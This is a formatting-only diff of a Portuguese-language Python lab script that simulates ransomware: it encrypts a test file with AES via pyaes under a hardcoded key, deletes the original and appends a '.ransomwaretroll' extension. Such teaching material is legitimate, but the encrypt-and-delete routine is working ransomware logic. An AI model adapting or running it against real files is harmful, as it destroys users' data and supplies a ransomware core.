@@ -1,12 +1,14 @@
 # -*- coding: utf-8 -*-
-'''
+"""
 File: decript.py
 Author: Marcelo Soares
 Description: Script para simular o ataque de um Ransomware
 Requirement: pip install pyaes
-'''
+"""
+
 import os
 import pyaes
+
 
 # Função principal para encriptar o arquivo de teste.txt
 # Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam
@@ -21,14 +23,17 @@ def encrypt_file(input_filename, output_filename, key):
                         break
                     encrypted_chunk = aes.encrypt(chunk)
                     encrypted_file.write(encrypted_chunk)
-        
+
         # Remover o arquivo original após a criptografia bem-sucedida
         os.remove(input_filename)
-        
-        print(f"Arquivo '{input_filename}' criptografado com sucesso em '{output_filename}'")
-    
+
+        print(
+            f"Arquivo '{input_filename}' criptografado com sucesso em '{output_filename}'"
+        )
+
     except Exception as e:
         print(f"Erro ao criptografar o arquivo: {str(e)}")
+
 
 # Como é um laboratório, inclui a estrutura if __name__=="__main__"
 # Dessa forma o código só será executado diretamente.
@@ -38,5 +43,6 @@ if __name__ == "__main__":
     encrypted_file_name = original_file_name + ".ransomwaretroll"
     encryption_key = b"testeransomwares"
 
-    encrypt_file(original_file_name, encrypted_file_name, encryption_key) # chamada da função aqui
-
+    encrypt_file(
+        original_file_name, encrypted_file_name, encryption_key
+    )  # chamada da função aqui
